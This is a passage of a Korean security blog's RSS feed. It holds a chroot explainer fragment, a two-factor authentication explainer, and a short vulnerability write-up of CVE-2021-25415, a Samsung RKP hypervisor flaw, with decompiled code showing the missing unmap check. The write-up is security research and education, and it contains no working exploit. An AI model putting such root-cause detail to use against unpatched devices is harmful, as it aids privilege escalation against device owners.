&#xC811;&#xADFC;&#xD558;&#xACE0;&#xC790; &#xD55C;&#xB2E4;&#xBA74; root directory&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; <code>/A/FileA1</code> &#xACFC; &#xAC19;&#xC774; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/10/poosic/chroot/3.png" alt></p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C; <code>chroot /A /bin/bash</code> &#xC640; &#xAC19;&#xC740; &#xBA85;&#xB839;&#xC5B4;&#xB85C; root directory&#xB97C; &#xBCC0;&#xACBD;&#xD574;&#xC900;&#xB2E4;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC774; <code>Process 1</code>&#xC758; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C;&#xC368; <code>Process1-1</code>&#xC774; &#xC0DD;&#xC131;&#xB418;&#xACE0; &#xD574;&#xB2F9; Process&#xC758; &#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB294; <code>/A</code>&#xAC00; &#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.  <code>Process1-1</code>&#xC5D0;&#xC11C;&#xB294; directory <code>/B</code>&#xC640; <code>/C</code>&#xBC0F; &#xD574;&#xB2F9; directory&#xC758; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD574; &#xC811;&#xADFC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC815;&#xBCF4; &#xC720;&#xCD9C;&#xACFC; &#xADF8;&#xB85C; &#xC778;&#xD55C; &#xD53C;&#xD574;&#xB97C; &#xCD5C;&#xC18C;&#xD654;&#xD558;&#xB294; &#xC218;&#xB2E8;&#xC73C;&#xB85C; &#xB9CE;&#xC774; &#xC774;&#xC6A9;&#xB418;&#xC5C8;&#xB358; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/chroot/">chroot</category>
      
      <category domain="https://hackyboiz.github.io/tags/root-directory/">root_directory</category>
      
      
      <comments>https://hackyboiz.github.io/2021/12/10/poosic/chroot/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-25415 : 삼성 모바일 제품의 RKP memory remapping 취약점</title>
      <link>https://hackyboiz.github.io/2021/12/09/l0ch/2021-12-09/</link>
      <guid>https://hackyboiz.github.io/2021/12/09/l0ch/2021-12-09/</guid>
      <pubDate>Thu, 09 Dec 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.impalabs.com/2111_attacking-samsung-rkp.html</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.impalabs.com/2111_attacking-samsung-rkp.html#vulnerability">Attacking Samsung RKP</a> </p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SMR JUN-2021 Release 1 &#xC774;&#xC804; RKP</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xBAA8;&#xBC14;&#xC77C;&#xC5D0;&#xC11C;&#xC758; sercurity hypervisor&#xB294; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; &#xCEE4;&#xB110; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xBCF4;&#xC7A5;&#xD574; &#xCEE4;&#xB110; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774;&#xB098; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xC0BC;&#xC131;&#xC740; RKP(Real-time Kernel Protection)&#xC73C;&#xB85C; security hypervisor&#xB97C; &#xAD6C;&#xD604;&#xD588;&#xC73C;&#xBA70; RKP&#xC758; &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xAC1C;&#xC694;&#xC640; &#xC8FC;&#xC694; &#xBCF4;&#xC548; &#xAE30;&#xB2A5;&#xC740; <a href="https://www.samsungknox.com/ko/blog/real-time-kernel-protection-rkp">&#xB9C1;&#xD06C;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>ARMv8&#xC758; exception model&#xC740; &#xB124; &#xAC00;&#xC9C0; &#xB808;&#xBCA8;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. </p><p>EL0(&#xC720;&#xC800; APP) &lt; EL1(&#xCEE4;&#xB110;) &lt; EL2(&#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800;) &lt; EL3(TrustZone Monitor)</p></blockquote><p>&#xC0BC;&#xC131; RKP&#xB294; EL1&#xC774; &#xC190;&#xC0C1;&#xB418;&#xC5B4;&#xB3C4; EL2&#xB85C;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xAD8C;&#xD55C; &#xBCC0;&#xACBD;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xAC00; &#xC788;&#xC9C0;&#xB9CC;, &#xC774; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xAC00; &#xCDA9;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xC544; EL2 &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC4F0;&#xAE30; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xB9E4;&#xD551;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; RKP&#xAC00; <code>rkp_s2_page_change_permission</code>  &#xB610;&#xB294; <code>rkp_s2_range_change_permission</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xB2E8;&#xC77C; &#xD398;&#xC774;&#xC9C0; &#xD639;&#xC740; &#xC8FC;&#xC18C; &#xBC94;&#xC704; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xBCC0;&#xACBD;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int64_t</span> <span class="hljs-title">rkp_s2_page_change_permission</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* p_addr, <span class="hljs-keyword">uint64_t</span> access, <span class="hljs-keyword">uint32_t</span> exec, <span class="hljs-keyword">uint32_t</span> allow)</span> </span>{  <span class="hljs-comment">// ...</span>  <span class="hljs-keyword">if</span> (is_phys_map_s2unmap(p_addr)) {  <span class="hljs-comment">// page must not be marked S2UNMAP in the physmap</span>    rkp_policy_violation(<span class="hljs-string">&quot;Error page was s2 unmapped before %p&quot;</span>, p_addr);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  }  <span class="hljs-keyword">if</span> (map_s2_page(p_addr, p_addr, <span class="hljs-number">0x1000</span>, attrs) &lt; <span class="hljs-number">0</span>) {    rkp_policy_violation(<span class="hljs-string">&quot;map_s2_page failed, p_addr : %p, attrs : %d&quot;</span>, p_addr, attrs);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  }  tlbivaae1is(((p_addr + <span class="hljs-number">0x80000000</span>) | <span class="hljs-number">0xFFFFFFC000000000</span>) &gt;&gt; <span class="hljs-number">12</span>);  <span class="hljs-keyword">return</span> rkp_set_pgt_bitmap(p_addr, access);}<span class="hljs-function"><span class="hljs-keyword">int64_t</span> <span class="hljs-title">rkp_s2_range_change_permission</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> start_addr, <span class="hljs-keyword">uint64_t</span> end_addr, <span class="hljs-keyword">uint64_t</span> access,  <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">execuint32_t</span> allow)</span> </span>{  <span class="hljs-comment">// ...</span>  p_addr_start = start_addr;  <span class="hljs-keyword">if</span> (s2_map(start_addr, end_addr - start_addr, attrs, &amp;p_addr_start) &lt; <span class="hljs-number">0</span>) {    uh_log(<span class="hljs-string">&apos;L&apos;</span>, <span class="hljs-string">&quot;rkp_paging.c&quot;</span>, <span class="hljs-number">222</span>, <span class="hljs-string">&quot;s2_map returned false, p_addr_start : %p, size : %p&quot;</span>, p_start_addr, size);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  }  <span class="hljs-keyword">if</span> (start_addr == end_addr)    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  addr = start_addr;  <span class="hljs-keyword">do</span> {    res = rkp_set_pgt_bitmap(addr, access);    <span class="hljs-keyword">if</span> (res &lt; <span class="hljs-number">0</span>) {      uh_log(<span class="hljs-string">&apos;L&apos;</span>, <span class="hljs-string">&quot;rkp_paging.c&quot;</span>, <span class="hljs-number">229</span>, <span class="hljs-string">&quot;set_pgt_bitmap fail, %p&quot;</span>, addr);      <span class="hljs-keyword">return</span> res;    }    tlbivaae1is(((addr + <span class="hljs-number">0x80000000</span>) | <span class="hljs-number">0xFFFFFFC000000000</span>) &gt;&gt; <span class="hljs-number">12</span>);    addr += <span class="hljs-number">0x1000</span>;  } <span class="hljs-keyword">while</span> (addr &lt; end_addr);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><code>rkp_s2_page_change_permission</code>&#xB294; physmap&#xC758; S2UNMAP&#xC774; &#xC124;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC544;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xC870;&#xAC74;&#xC744; &#xD655;&#xC778;&#xD55C; &#xB2E4;&#xC74C;  <code>map_s2_page</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xD398;&#xC774;&#xC9C0; &#xB2E8;&#xC704; &#xB9E4;&#xD551;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098;<code>rkp_s2_range_change_permission</code>&#xB294; &#xC774;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xACE0;  <code>s2_map</code>&#xC744; &#xD638;&#xCD9C;&#xD574; &#xC8FC;&#xC18C; &#xBC94;&#xC704; &#xB2E8;&#xC704;&#xB85C; &#xB9E4;&#xD551;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB9E4;&#xD551; &#xD574;&#xC81C;&#xB3C4; &#xB9E4;&#xD551;&#xACFC; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xC218;&#xD589;&#xD558;&#xBA70; &#xC544;&#xB798;&#xB294; &#xC8FC;&#xC18C; &#xBC94;&#xC704;&#xC758; &#xB9E4;&#xD551;&#xC744; &#xD574;&#xC81C;&#xD558;&#xB294; <code>s2_unmap</code> &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int64_t</span> <span class="hljs-title">s2_unmap</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> orig_addr, <span class="hljs-keyword">uint64_t</span> orig_size)</span> </span>{  <span class="hljs-comment">// ...</span>  addr = orig_addr &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000</span>;  size = (orig_addr &amp; <span class="hljs-number">0xFFF</span>) + orig_size;  <span class="hljs-keyword">if</span> (!size)    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0x3FFFFFFF</span> &amp;&amp; (addr &amp; <span class="hljs-number">0x3FFFFFFF</span>) == <span class="hljs-number">0</span>) {    <span class="hljs-keyword">if</span> (unmap_s2_page(addr, <span class="hljs-number">0x40000000</span>)) {      uh_log(<span class="hljs-string">&apos;L&apos;</span>, <span class="hljs-string">&quot;s2.c&quot;</span>, <span class="hljs-number">1175</span>, <span class="hljs-string">&quot;unable to unmap 1gb s2 page: %p&quot;</span>, addr);      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    size -= <span class="hljs-number">0x40000000</span>;    addr += <span class="hljs-number">0x40000000</span>;    <span class="hljs-keyword">if</span> (!size)      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0x1FFFFF</span> &amp;&amp; (addr &amp; <span class="hljs-number">0x1FFFFF</span>) == <span class="hljs-number">0</span>) {    <span class="hljs-keyword">if</span> (unmap_s2_page(addr, <span class="hljs-number">0x200000</span>)) {      uh_log(<span class="hljs-string">&apos;L&apos;</span>, <span class="hljs-string">&quot;s2.c&quot;</span>, <span class="hljs-number">1183</span>, <span class="hljs-string">&quot;unable to unmap 2mb s2 page: %p&quot;</span>, addr);      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    size -= <span class="hljs-number">0x200000</span>;    addr += <span class="hljs-number">0x200000</span>;    <span class="hljs-keyword">if</span> (!size)      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0xFFF</span> &amp;&amp; (addr &amp; <span class="hljs-number">0xFFF</span>) == <span class="hljs-number">0</span>) {    <span class="hljs-keyword">if</span> (unmap_s2_page(addr, <span class="hljs-number">0x1000</span>)) {      uh_log(<span class="hljs-string">&apos;L&apos;</span>, <span class="hljs-string">&quot;s2.c&quot;</span>, <span class="hljs-number">1191</span>, <span class="hljs-string">&quot;unable to unmap 4kb s2 page: %p&quot;</span>, addr);      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }    size -= <span class="hljs-number">0x1000</span>;    addr += <span class="hljs-number">0x1000</span>;    <span class="hljs-keyword">if</span> (!size)      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><code>s2_unmap</code>&#xC740; <code>s2_map</code>&#xACFC; &#xC720;&#xC0AC;&#xD558;&#xAC8C; <code>unmap_s2_page</code>&#xB97C; &#xC5EC;&#xB7EC;&#xBC88; &#xD638;&#xCD9C;&#xD574; &#xC8FC;&#xC18C; &#xBC94;&#xC704;&#xC758; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB9E4;&#xD551; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD398;&#xC774;&#xC9C0;&#xB97C; <code>physmap</code>&#xC5D0;&#xC11C; <code>S2UNMAP</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xB294; <code>rkp_phys_map_set</code>, <code>rkp_phys_map_set_region</code> , <code>sparsemap_set_value_addr</code>&#xC5D0; &#xB300;&#xD55C; &#xD638;&#xCD9C;&#xC774; &#xC5C6;&#xC5B4; &#xC774;&#xD6C4; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC4F0;&#xAE30; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB2E4;&#xC2DC; &#xB9E4;&#xD551;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810; &#xC678;&#xC5D0;&#xB3C4; CVE-2021-25411(&#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xCEE4;&#xB110; &#xD398;&#xC774;&#xC9C0; &#xC0DD;&#xC131;), CVE-2021-25416(read-only &#xAD8C;&#xD55C; &#xCEE4;&#xB110; write) &#xB4F1;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC815;&#xBCF4; &#xB610;&#xD55C; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/samsung/">samsung</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/rkp/">rkp</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-25415/">cve-2021-25415</category>
      
      <category domain="https://hackyboiz.github.io/tags/hypervisor/">hypervisor</category>
      
      
      <comments>https://hackyboiz.github.io/2021/12/09/l0ch/2021-12-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Two-factor authentication(2FA), Two-step Verification(2SV)</title>
      <link>https://hackyboiz.github.io/2021/12/08/y00n_nms/two-factor-authentication/</link>
      <guid>https://hackyboiz.github.io/2021/12/08/y00n_nms/two-factor-authentication/</guid>
      <pubDate>Wed, 08 Dec 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;2&amp;#xB2E8;&amp;#xACC4; &amp;#xC778;&amp;#xC99D;(2&amp;#xC694;&amp;#xC18C; &amp;#xC778;&amp;#xC99D;, 2FA)&amp;#xACFC; 2&amp;#xB2E8;&amp;#xACC4; &amp;#xD655;&amp;#xC778;(2SV)&amp;#xC740; &amp;#xAC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>2&#xB2E8;&#xACC4; &#xC778;&#xC99D;(2&#xC694;&#xC18C; &#xC778;&#xC99D;, 2FA)&#xACFC; 2&#xB2E8;&#xACC4; &#xD655;&#xC778;(2SV)&#xC740; &#xACC4;&#xC815; &#xD0C8;&#xCDE8;&#xB85C;&#xBD80;&#xD130; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC5D0; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBCF4;&#xD638;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC628;&#xB77C;&#xC778;&#xC5D0;&#xC11C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB410;&#xB358; &#xC544;&#xC774;&#xB514;/&#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB9CC;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xB2E8;&#xC77C; &#xC694;&#xC18C; &#xC778;&#xC99D; &#xBC29;&#xC2DD;&#xC740; &#x2018;12345&#x2019;, &#x2018;password&#x2019;, &#x2018;qwerty&#x2019;&#xC640; &#xAC19;&#xC740; &#xB2E8;&#xC21C;&#xD55C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC0AC;&#xC6A9;, &#xC5EC;&#xB7EC; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xAC19;&#xC740; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xC5EC;&#xB7EC; &#xBB38;&#xC81C;&#xC810;&#xC73C;&#xB85C; &#xC27D;&#xAC8C; &#xACC4;&#xC815; &#xD0C8;&#xCDE8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xACC4;&#xC815;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xC790;&#xC2E0;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC99D;&#xBA85;&#xD558;&#xAE30; &#xC704;&#xD558;&#xC5EC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC694;&#xC18C;&#xB97C; &#xC81C;&#xC2DC;&#xD558;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC54C;&#xACE0; &#xC788;&#xB294; &#xAC83;: &#xBE44;&#xBC00;&#xBC88;&#xD638;, &#xBCF4;&#xC548; &#xC9C8;&#xBB38;, PIN &#xBC88;&#xD638; &#xB4F1;</li><li>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xAC83;: &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0;, &#xC2E0;&#xC6A9;&#xCE74;&#xB4DC;, &#xBCF4;&#xC548;&#xD0A4;(OTP)</li><li>&#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2E0;&#xCCB4;&#xC801; &#xD2B9;&#xC9D5;: &#xC9C0;&#xBB38;, &#xD64D;&#xCC44;, &#xC0DD;&#xCCB4; &#xC815;&#xBCF4; &#xC778;&#xC2DD;</li><li>&#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC704;&#xCE58;: GPS &#xCD94;&#xC801;</li></ul><p><img src="/2021/12/08/y00n_nms/two-factor-authentication/image.png" alt="image"></p><p>2&#xB2E8;&#xACC4; &#xC778;&#xC99D;(2FA)&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC54C;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC5D0; &#xCD94;&#xAC00;&#xB85C; &#xB2E4;&#xB978; &#xC720;&#xD615;&#xC758; &#xC778;&#xC99D; &#xC694;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0;(&#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xAC83;)&#xC5D0; &#xACE0;&#xC720;&#xD55C; &#xC77C;&#xD68C;&#xC6A9; &#xC554;&#xD638;(OTP)&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xC554;&#xD638;&#xB97C; &#xB2E4;&#xC2DC; &#xC785;&#xB825;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>2&#xB2E8;&#xACC4; &#xD655;&#xC778;(2SV)&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC54C;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC5D0; &#xCD94;&#xAC00;&#xB85C; &#xB3D9;&#xC77C;&#xD55C; &#xC720;&#xD615;&#xC758; &#xC778;&#xC99D; &#xC694;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74;, &#x2018;&#xD0A4;&#xC6B0;&#xB358; &#xBC18;&#xB824;&#xB3D9;&#xBB3C;&#xC758; &#xC774;&#xB984;&#xC740;?&#x2019;&#xACFC; &#xAC19;&#xC774; &#xC774;&#xC804;&#xC5D0; &#xC124;&#xC815;&#xD574; &#xB454; &#xBCF4;&#xC548; &#xC9C8;&#xBB38;&#xC5D0; &#xB2F5;&#xBCC0;&#xD558;&#xAC70;&#xB098; PIN &#xBC88;&#xD638;&#xB97C; &#xC785;&#xB825;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/2fa/">2fa</category>
      
      <category domain="https://hackyboiz.github.io/tags/2sv/">2sv</category>
      
      
      <comments>https://hackyboiz.github.io/2021/12/08/y00n_nms/two-factor-authentication/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
